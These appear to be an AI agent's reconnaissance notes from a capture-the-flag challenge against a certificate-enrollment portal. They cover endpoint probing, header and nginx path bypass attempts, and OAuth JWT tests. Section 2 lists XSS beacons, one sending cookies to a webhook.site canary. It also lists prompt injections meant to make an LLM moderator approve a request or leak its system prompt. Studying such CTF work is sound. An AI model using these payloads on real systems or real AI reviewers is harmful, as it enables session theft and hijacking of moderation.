# BeeCA — WEB + LOGIC lane notes

**Cross-lane sync (read after CRYPTO_NOTES.md appeared):** the crypto lane independently reached
the exact same conclusion — every path forward (CN-derivation test, getting a real leaf cert to
probe BasicConstraints/serials, testing feedback-driven approval with a real UUID) is blocked on
**one shared requirement: a real, completed Google OAuth login through an actual browser**. They
also found and dead-ended a real nginx vhost-isolation bug (unmatched `Host` header falls through
to a `default_server` that skips the mTLS wall entirely — but only reaches the *same* portal
backend, no distinct "admin" application, so no flag from it) — see their §4, and it independently
confirms my §6 finding that `/internal/cert` isn't a real route on that fallback backend either.
Their OAuth-state JWT tests (alg:none, bad signature) match mine — both lanes independently ruled
out state-forgery as a login bypass. No contradictions between the two notes files.

Scope: unauthenticated attack surface, `/api/*` behavior, feedback XSS/prompt-injection
channel, CN-control-at-enroll. Crypto/mTLS/CA is a separate lane (see CRYPTO_NOTES.md
when it appears).

## 1. Anonymous reachability (curl, no cookies/session)

| Endpoint | Method | Anon result |
|---|---|---|
| `/api/me` | GET | `200 {"authenticated":false}` |
| `/api/enroll` | POST | `401 {"error":"unauthorized"}` |
| `/api/cert` | GET | `401 {"error":"unauthorized"}` |
| `/api/feedback` | POST `{request_id,message}` | **`200`, works fully anonymously, no session, no cookie required** |
| `/login` | GET | `302` → real `accounts.google.com` OAuth2 (see §3) |
| `/internal/cert?uuid=&action=` | GET/POST | `403 Forbidden` (bare nginx page, **blocked at nginx layer**, not app layer) — same on the external portal host regardless of auth. No Host-header/SNI trick attempted yet from this box (would need to actually resolve/connect to the internal IP, which we don't have). |
| `admin-bv5kavo6.beeca.avitoctf.ru/` | GET | `403` plain text `"Для доступа требуется клиентский сертификат BeeCA."`, `Connection: close` — mTLS wall, app never reached without a client cert. |

So `/api/feedback` is the only endpoint an unauthenticated attacker can meaningfully use.
`/api/enroll` and `/api/cert` are hard-gated on a real session (tried common bypass headers:
`X-Debug-Email`, `X-User-Email`, `X-Forwarded-User`, `X-Forwarded-Email`, `Authorization: Bearer admin`,
`X-Original-User` — all still `401`. No debug backdoor found in the bundle either, grepped for
`debug|impersonat|backdoor|mock|bypass` — nothing but React internals ("useDebugValue" etc).

## 2. `/api/feedback` is a wide-open, unvalidated echo/log sink

Confirmed via curl (no cookies at all):
```
POST /api/feedback {"request_id":"test","message":"hello"}
-> 200 {"eta_business_days":5,"message":"hello","ok":true,"request_id":"test"}
```
- Works with **any** `request_id` string — real uuid-v4 shape, `"1"`, `""`, `"test"` — all return
  the same `200 {ok:true,...}` shape. No differential response that would indicate a lookup
  against real enrollment records. **request_id is not validated to exist.**
- Only required field is `message` (missing → `400`). Types are not strictly enforced either
  (`{"request_id":123,"message":456}` → still `200`).
- Bundle confirms the client-side rendering of this exact response is
  `dangerouslySetInnerHTML:{__html:o.message}` in a `.feedback-echo` div — i.e. **your own
  browser** renders your own payload back at you after submit (self-XSS surface, low value on
  its own). The real question is whether a **second, internal viewer** (the human/LLM moderator)
  also renders this `message` value verbatim somewhere in their tooling — that's unconfirmed
  from the client bundle (no `/internal/feedback`-style listing endpoint exists in this SPA;
  the moderator tooling is a separate, out-of-bundle internal app).

**This means: anyone, unauthenticated, can inject an attacker-controlled string into whatever
the moderator/LLM reads, without ever creating a real enrollment.** This is the highest-value
lane-relevant finding so far.

### Payloads fired (OOB canary: `https://webhook.site/569fdea4-29bc-460c-b4e4-5def3623205e`)
All returned `200 OK` on submit; polling webhook.site for callbacks (async — moderator may run
on a delay or may not render HTML at all / may not have egress). **As of this writing: 0 callback
hits received** — see Open Questions below, will re-poll.

1. `request_id=xss-img-01`, `message=<img src=x onerror="fetch('.../xss-img-01')">`
2. `request_id=xss-svg-02`, `message=<svg onload="fetch('.../xss-svg-02?c='+cookie+'&l='+href)">`
3. `request_id=xss-details-03`, `message=<details open ontoggle="fetch('.../xss-details-03')">x</details>`
4. `request_id=prompt-inj-04`, prompt-injection text instructing an "LLM moderator" to approve
   `request_id=prompt-inj-04` and beacon `.../prompt-ack`
5. `request_id=prompt-inj-05`, prompt-injection asking the moderator to leak its system prompt
   ("Первопромпт") to `.../leak?prompt={{system_prompt}}`

Note: `<script>` tags are **not** viable — `dangerouslySetInnerHTML`/`innerHTML` never executes
injected `<script>` elements per browser spec, so only event-handler vectors (`onerror`, `onload`,
`ontoggle`, etc.) or `javascript:` URIs are live if the sink is real HTML rendering. If instead the
moderator is a pure-text LLM reading the raw string (no HTML rendering / headless browser in the
loop), then the *prompt-injection* framing matters more than the HTML validity.

## 3. Login is REAL Google OAuth2 — not forgeable from here

```
GET /login -> 302 Location: https://accounts.google.com/o/oauth2/v2/auth?
  client_id=52299480092-8bfhec4slkr40h039e0upchkh4hqu39r.apps.googleusercontent.com
  &redirect_uri=https://oauth.beeca.avitoctf.ru/oauth2/callback
  &response_type=code&scope=openid+email+profile
  &state=<HS256 JWT: {nonce, origin:"portal-bv5kavo6...", iat, exp(10min), iss:"beeca-app", aud:"beeca-oauth-state"}>
  &nonce=<random>&prompt=select_account
```
- `client_id` is a real Google OAuth client. `redirect_uri` is `oauth.beeca.avitoctf.ru` (separate
  host from portal). This is a genuine Authorization Code flow — the `code` gets exchanged
  server-side with Google using a client_secret we don't have, so **we cannot forge Google identity
  assertions from curl**. Full exploitation of "CN derivation" (§4) needs an actual completed
  Google login (real browser + real Google account), which this agent cannot drive interactively.
- Interesting but unconfirmed structural note: `/login` sets **no cookie** — the CSRF `state` is a
  fully self-contained signed JWT (nonce+origin+short exp), not bound to a session cookie set at
  `/login` time. `GET /oauth2/callback` with no params → `400 {"error":"bad state"}` (checked first,
  before any Google interaction). Whether this stateless-state design is itself exploitable
  (state-replay / login-CSRF against a victim who *does* have a real Google admin account) is
  **unconfirmed** — would need to get a real admin/moderator to click a state we minted. Flagging
  for the crypto lane too since state is JWT/HS256 (worth checking for weak-secret / alg-confusion,
  though that's arguably their lane).

## 4. CN control at enroll — client sends NOTHING

Reading the bundle's enroll call directly:
```js
fetch("/api/enroll",{method:"POST",credentials:"same-origin"})  // NO BODY AT ALL
-> {serial, cn, status}   // status: "pending" (needs approval) or "issued"
```
There is **no CSR upload, no CN/email/display-name field in the request** — `cn` is entirely
server-derived from the authenticated session (Google identity), confirming the bundle's own
`[policy] CN is derived from verified SSO identity` string. **Client-side CN injection (null byte,
extra RDNs, unicode) is not possible — there is no field to inject into.**

This pushes the real question to: *what part of the verified Google identity does the server use
to build CN, and is that part user-controllable?* Two live hypotheses, neither confirmed yet
(need a real logged-in session to test):
- **CN = email local-part.** If so, an attacker-owned Google Workspace account
  `admin@<attacker-domain>` (domain-verified via Workspace, so "verified SSO identity" is honestly
  satisfied) would yield `cn=admin`. Feasible but requires owning/verifying a domain in Google
  Workspace — a real-world setup step, not a request-crafting one.
- **CN = Google profile display name.** Google consumer accounts let you set your name to
  arbitrary strings incl. a bare word like "admin" (subject to Google's name-policy heuristics,
  which do sometimes allow single common words). If the backend takes `name` (requested via
  `scope=openid+email+profile`) rather than `email`, this is a **much cheaper** attack — no domain
  needed, just rename a Google account to `admin` and log in normally.

**I cannot distinguish between these (or rule out a third derivation, e.g. `sub`-based mapping)
without actually completing a Google login and reading back `/api/me` / `/api/enroll`'s `cn` value.**
This is the concrete unblock needed: **a real Google account login through a real browser**,
then hand the resulting session/cookie to this lane to inspect the returned `cn`.

## 5. Operator console (`#/operator`) is a client-side-only preview, not a real bypass

`Vd` component (route `#/operator`): shows a fake "operator console" UI when either (a) hostname
matches the internal pattern (`Li()`), or (b) `location.hash === "#/operator"` on any host — but
case (b) auto-reverts to normal user view after 70ms via `history.replaceState` (`Wd()`/effect in
`Qd()`), i.e. it's a **cosmetic "track what happens internally" preview** (matches the button label
"Проследить передачу во внутренний контур" = "trace the handoff to the internal loop"), not a real
privilege escalation. Its "Approve/Decline" buttons call **relative** `fetch("/internal/cert?uuid=...&action=...")`
— on the external portal host this 403s at nginx (confirmed §1); it would only ever function for
real if loaded from the actual `certissue-<token>.internal` host, which is not attacker-reachable
over the public internet (internal DNS name, presumably intranet-only / only resolvable by the
moderator's own network). No Host-header override or DNS trick attempted yet from outside since we
have no route to that IP space at all (checked: `/internal/cert` 403s at nginx even with a
`Host: certissue-bv5kavo6.internal` header spoofed against the portal IP — see below).

Confirmed tested (see §6 below): this Host-header/DNS trick does **not** work — falls into a
generic edge catch-all, does not reach any real backend.

## 6. Infra fingerprinting

- **Backend is Python/Flask (Werkzeug).** `/api/nonexistent` → classic Werkzeug 404 HTML
  (`<!doctype html><html lang=en><title>404 Not Found</title>...`). `GET /api/enroll` (wrong
  method) → Werkzeug `405 Method Not Allowed` with `Allow: POST, OPTIONS` header.
  `OPTIONS /api/enroll` → `200`, `Allow: POST, OPTIONS`, empty body.
- **Server-side type coercion on `message`**: `POST /api/feedback {"message": null}` echoes back
  `"message":"None"` (Python `str(None)`), `{"message":[1,2,3]}` echoes `"message":"[1, 2, 3]"`
  (Python `str([1,2,3])`) — confirms `message = str(body.get("message"))`-style handling, and that
  the endpoint is permissive about input types (only a *present* `message` key is required; missing
  key → `400 {"error":"message required"}`).
- No stack traces / Werkzeug debug console observed on malformed input (malformed JSON, wrong
  Content-Type, no Content-Type — all handled gracefully, `400 {"error":"message required"}`).
  Debug mode does not appear to be exposed on these error paths.
- `/internal/cert` blocking is **nginx-layer** (`403 Forbidden`, stock nginx error template,
  `Server: nginx/1.27.5` boilerplate — NOT Werkzeug's error format), confirmed distinct from the
  app's own 404/405 pages. Tried nginx path-normalization/case bypasses against it — all still
  blocked or fall through to a *different* generic 404 (not the real endpoint):
  `/internal/cert/`, `//internal/cert`, `/internal//cert`, `/internal/cert%2F`, `/internal/./cert`,
  `/internal/cert;.json`, `/internal/cert%20`, `/./internal/cert` → all `403` (still nginx-blocked).
  `/Internal/Cert`, `/INTERNAL/CERT` → `404` (case-sensitive location match misses, falls through
  to Werkzeug 404 — not the real handler either). **No bypass found.**
- `certissue-bv5kavo6.internal` **does resolve publicly** (`dig` → same IP `93.77.163.176` as the
  portal, i.e. wildcard DNS for `*.avitoctf.ru`-style zone), but sending
  `Host: certissue-bv5kavo6.internal` (via `--resolve`) to that IP over TLS returns a *third*,
  distinct error shape: bare 9-byte body `not found` (not nginx's 403 template, not Werkzeug's 404
  template) — almost certainly nginx's `default_server` catch-all for unmatched `Host` headers on
  this edge, i.e. there is **no vhost for the internal name on this public edge at all**; the real
  `certissue` service is not colocated/reachable here. Ruled out Host-header/SNI confusion as a
  path to the internal service.
- **Port scan is a decoy**: `nc -z` against the portal IP shows ports 80/443/8080/8443/3000/5000/
  8000/9000 all TCP-accepting, but `curl` to any of them except the real HTTPS vhost gets an
  instant empty reply (`http_code=000`, "Empty reply from server") — a tarpit/stealth-accept
  firewall, not real listeners. No hidden HTTP service found by port-scanning this IP.
- **OAuth `state` JWT is properly verified** — tested both `alg:none` (unsigned) and a
  bit-flipped-signature state against `oauth.beeca.avitoctf.ru/oauth2/callback`: both correctly
  rejected with `400 {"error":"bad state"}` *before* any Google interaction is attempted. A
  freshly-minted real `state` + a garbage `code` gets past state validation and fails only at
  `{"error":"oauth failed"}` (i.e. the real Google code-exchange is genuinely attempted and
  genuinely fails for a fake code). **No JWT-forgery or algorithm-confusion bypass on the OAuth
  state.** This closes off "spoof the SSO identity via state tampering" as an avenue — the login
  really does require a real completed Google consent flow.
- Tried alternate JSON body field names on `/api/enroll` in case CN/email were accepted
  out-of-band despite the bundle showing no such fields (`cn`, `email`, `name`, `display_name`,
  `csr`) — all still plain `401 {"error":"unauthorized"}`, no behavior change. Confirms enroll is
  gated purely on session state, body is ignored entirely pre-auth.

## 7. Feedback OOB test — result

Fired 10 distinct payloads at `/api/feedback` (classic XSS beacons: `<img onerror>`, `<svg onload>`,
`<details ontoggle>`, `<input autofocus onfocus>`, `<style>@import`; plus 5 prompt-injection
framings in English and Russian, incl. fake `<system>`/tool-call syntax) against a fresh
webhook.site canary (`https://webhook.site/569fdea4-29bc-460c-b4e4-5def3623205e`). All 10 POSTs
returned `200 OK`. **Polled for ~10 minutes (initial + 20s-interval background monitor): 0 callback
hits received.** This does not rule out the hypothesis — plausible explanations, unconfirmed:
- The moderator/bot may only process feedback tied to a **real, authenticated** enrollment
  (i.e. it may look up `request_id` against real records server-side even though the *echo*
  response itself doesn't validate — the `200 OK` we get is just confirming receipt, not proof of
  downstream processing).
- The moderator may run on a slow/manual cadence (site copy literally says "среднее время ответа
  — 5 рабочих дней" — 5 business days — so real-time OOB confirmation may simply be the wrong
  timescale for this channel).
- The moderator's execution environment may have no outbound internet egress (sandboxed
  read-only viewer), so even a successful XSS/prompt-injection would never beacon out — would
  need a different oracle (e.g. state-change on our own enrollment) rather than OOB network canary.
- The moderator may not render `message` as HTML at all internally (only the submitter's own
  browser does, via `dangerouslySetInnerHTML` in *this* SPA) — i.e. the real internal tool could
  be a plain-text log viewer, making the XSS payloads inert and only the prompt-injection framing
  (if the internal tool feeds `message` to an LLM) has any chance.

**This channel is not disproven, just not yet confirmed live** — worth re-testing once we have a
real authenticated `pending` enrollment (so `request_id` is a real, existing UUID) and/or over a
longer observation window.

## Open questions / next steps for this lane

### TOP PRIORITY — HARD BLOCKER: needs a real completed Google OAuth login
Everything server-side I can reach from here (`/api/enroll`, `/api/cert`, and the real `cn` value)
is gated on an actual, successfully completed Google OAuth2 consent flow
(`accounts.google.com` is genuinely the real Google — verified DNS resolves to a real Google IP,
and the `state` JWT is properly signature-checked, §6). **This agent has no interactive browser and
cannot complete a Google login.** This is a concrete, scoped ask for a human or a
browser-capable agent:

1. **Cheapest test first (no new infra, ~2 minutes):** on an existing Google account (e.g. the
   operator's own), change the account's display/given name to literally `admin`, then visit
   `https://portal-bv5kavo6.beeca.avitoctf.ru/login` and complete the Google consent screen.
   Immediately after, `GET /api/me` and inspect the `enrollment.cn` field (or `POST /api/enroll`
   and read `cn` from the response). **If `cn == "admin"`, the CN derivation is
   profile-display-name-based and is directly exploitable** — no domain purchase needed, this is
   probably the intended "logic" bug (self-reported identity field trusted as a stable/unique
   name).
2. **If (1) shows CN is email-local-part-based instead** (e.g. `cn` matches the part before `@`
   of the real email, not the display name): the same idea applies one level up — a
   Google Workspace trial on an attacker-owned domain lets you mint `admin@<yourdomain>`, which
   Google will happily hand back as a fully "verified" OAuth identity (domain ownership verified
   by Google, satisfying the bundle's `[policy] CN is derived from verified SSO identity` on its
   own terms) even though the *local part* collides with the real admin's CN. This is a bigger
   lift (domain reg + Workspace signup + DNS verification, maybe 15-30 min) — only pursue if (1)
   rules out the display-name path.
3. Whichever identity field turns out to drive `cn`, once we can mint `cn=admin` via a **normal
   self-service enrollment**, the enrollment still lands in `status=pending` and needs approval —
   circle back to the feedback/XSS/prompt-injection channel (§7) using the now-real, authenticated
   `request_id`/uuid to see if that unblocks approval, or hand off to the crypto lane once a
   `cn=admin` **pending** record exists (a signing/approval-race or CA-level flaw might issue it
   without waiting on the moderator at all — that's their lane to check once this exists).
4. Also worth checking once logged in: does `/api/enroll` allow being called a **second time**
   after the first (`"one session = one enrollment request"` — is that enforced server-side, or
   just a UI copy claim)? And does logging out/back in with a *renamed* Google account let an
   existing account re-enroll under a new `cn`, or is `cn` cached/pinned to the Google `sub` from
   first enrollment?

### Secondary / already-explored-but-worth-revisiting
5. Re-poll `https://webhook.site/569fdea4-29bc-460c-b4e4-5def3623205e` periodically for delayed
   callbacks from the 5 XSS/prompt-injection payloads (§7) — 0 hits after ~10 min, but the site
   copy claims a 5-business-day review SLA, so this may just be too early to call dead.
6. Once a real `pending` enrollment UUID exists (from item 1-2 above), resend the same
   XSS/prompt-injection payloads with that **real** `request_id` (current tests used fake/anon
   IDs) — this removes the "moderator only processes real records" confound noted in §7.
7. Nginx path-normalization/Host-spoofing against `/internal/cert` is now a **closed dead end**
   (§6) — do not re-spend time there. Port-scanning the edge IP is also a **closed dead end**
   (tarpit, §6).
